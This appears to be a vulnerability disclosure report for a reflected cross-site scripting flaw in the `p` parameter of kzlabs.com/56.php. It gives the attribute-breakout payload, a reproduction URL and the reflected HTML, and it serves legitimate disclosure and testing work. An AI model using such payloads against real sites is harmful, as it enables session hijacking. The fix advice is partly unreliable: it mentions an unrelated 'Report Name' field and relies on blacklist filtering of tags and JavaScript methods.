## Title

Reflected Cross-Site Scripting (XSS) via `p` Parameter in HTML Attribute Context

## Vulnerability Type

Reflected XSS

## Summary

The `p` parameter is reflected inside an HTML attribute context without proper sanitization or output encoding, allowing arbitrary JavaScript execution in the victim’s browser.

The issue occurs when user-controlled input is injected directly into the `data-query` attribute without safely escaping special characters, enabling attribute breakout and malicious event handler injection.

## Vulnerable Endpoint

```http
https://kzlabs.com/56.php
```

### Vulnerable Parameter

```http
p
```

## Steps to Reproduce

1. Open the following URL:

```http
https://kzlabs.com/56.php?p=%27+onmouseover%3Dconfirm%281%29+x%3D%27
```

2. Hover the mouse cursor over the affected element.

3. Observe that a JavaScript confirmation popup executes.

## Payload Used

```javascript
' onmouseover=confirm(1) x='
```

## Proof of Concept

The payload is reflected directly into an HTML attribute context without proper sanitization, allowing injection of a malicious event handler.

### Vulnerable Reflection

```html
<div class="section-header"
     data-query='' onmouseover=confirm(1) x=''
     data-page='feed'>
```

### Visible Reflection

```html
Showing results for “‘ onmouseover=confirm(1) x=’”
```

The injected payload breaks out of the original `data-query` attribute and injects a new `onmouseover` event handler, resulting in arbitrary JavaScript execution when a user hovers over the affected element.

### Screenshot — Confirmation Popup Triggered

<img width="1920" height="470" alt="image" src="https://github.com/user-attachments/assets/006712d3-5553-4896-9bee-3579fe3371fb" />


## Impact

An attacker can perform the following actions using this vulnerability:

* It allows attackers to hijack user sessions.
* It potentially leads to full account takeover.
* It allows attackers to perform unauthorized actions within the vulnerable application.
* It allows attackers to exfiltrate sensitive data.

## Recommendations for Fix

Validate and sanitize the `p` parameter to ensure that it does not contain any malicious content. This can be done by:

* Filter out HTML tags like: `<script>`, `<img>`, `<svg>` from the Report Name field before saving anything to the database
* Filter out JavaScript methods like: `alert()`, `confirm()`, `prompt()` so even if a tag slips through the method won't execute
* If you're using PHP then use `htmlspecialchars()` function before rendering any user input back to the page
* Use Cloudflare as they have so many WAF rules that almost all XSS payloads will be blocked automatically before even reaching the server
